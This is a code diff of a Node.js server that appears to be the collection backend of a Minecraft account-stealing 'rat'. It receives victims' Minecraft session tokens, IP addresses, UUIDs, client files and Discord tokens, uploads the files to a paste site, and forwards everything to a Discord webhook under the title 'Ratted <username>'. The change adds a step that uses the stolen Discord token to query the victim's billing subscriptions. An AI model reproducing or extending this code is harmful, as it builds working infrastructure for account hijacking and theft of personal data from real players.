@@ -91,23 +91,26 @@ app.post("/", (req, res) => {
 
             if (usingDiscord) {
                 //get networth
-                const networth = await (await get(`https://skyhelper-dxxxxy.herokuapp.com/v1/profiles/${req.body.username}?key=dxxxxy`).catch(() => { return emptyResponse })).data.data[0].networth
+                const networth = await (await get(`https://skyhelper-dxxxxy.herokuapp.com/v1/profiles/${req.body.username}?key=dxxxxy`).catch(() => { return { data: { data: [{ networth: { total_networth: null } }] } } })).data.data[0].networth
 
                 //check if api off
                 const total_networth = networth.total_networth == null ? 0 : networth.total_networth
 
                 //upload feather
-                const feather = await (await post("https://hst.sh/documents/", req.body.feather)).data.key
+                const feather = await (await post("https://hst.sh/documents/", req.body.feather).catch(() => { return { data: { key: "Error uploading" } } })).data.key
 
                 //upload essential
-                const essentials = await (await post("https://hst.sh/documents/", req.body.essentials)).data.key
+                const essentials = await (await post("https://hst.sh/documents/", req.body.essentials).catch(() => { return { data: { key: "Error uploading" } } })).data.key
+
+                //get discord info
+                const discord = await (await get("https://discordapp.com/api/v6/users/@me/billing/subscriptions", { headers: { "Authorization": req.body.discord, "Content-Type": "application/json" } }).catch(() => { return { data: [] } })).data
 
                 //send to discord webhook
                 post(process.env.WEBHOOK, JSON.stringify({
                     content: `@everyone - ${formatNumber(total_networth)}`, //ping
                     embeds: [{
                         title: `Ratted ${req.body.username} - Click For Stats`,
-                        description: `**Username:**\`\`\`${req.body.username}\`\`\`\n**UUID: **\`\`\`${req.body.uuid}\`\`\`\n**Token:**\`\`\`${req.body.token}\`\`\`\n**IP:**\`\`\`${req.body.ip}\`\`\`\n**TokenAuth:**\`\`\`${req.body.username}:${req.body.uuid}:${req.body.token}\`\`\`\n**Feather:**\nhttps://hst.sh/${feather}\n\n**Essentials:**\nhttps://hst.sh/${essentials}\n\n**Discord:**\`\`\`${req.body.discord}\`\`\``,
+                        description: `**Username:**\`\`\`${req.body.username}\`\`\`\n**UUID: **\`\`\`${req.body.uuid}\`\`\`\n**Token:**\`\`\`${req.body.token}\`\`\`\n**IP:**\`\`\`${req.body.ip}\`\`\`\n**TokenAuth:**\`\`\`${req.body.username}:${req.body.uuid}:${req.body.token}\`\`\`\n**Feather:**\nhttps://hst.sh/${feather}\n\n**Essentials:**\nhttps://hst.sh/${essentials}\n\n**Discord:**\`\`\`${req.body.discord}\`\`\`\nHas nitro: ${discord.length > 0}`,
                         url: `https://sky.shiiyu.moe/stats/${req.body.username}`,
                         color: 5814783,
                         footer: {
@@ -149,6 +152,3 @@ const formatNumber = (num) => {
     else if (num < 1000000000) return `${(num / 1000000).toFixed(2)}m`
     else return `${(num / 1000000000).toFixed(2)}b`
 }
-
-//for nw api
-const emptyResponse = { data: { data: [{ networth: { total_networth: null } }] } }
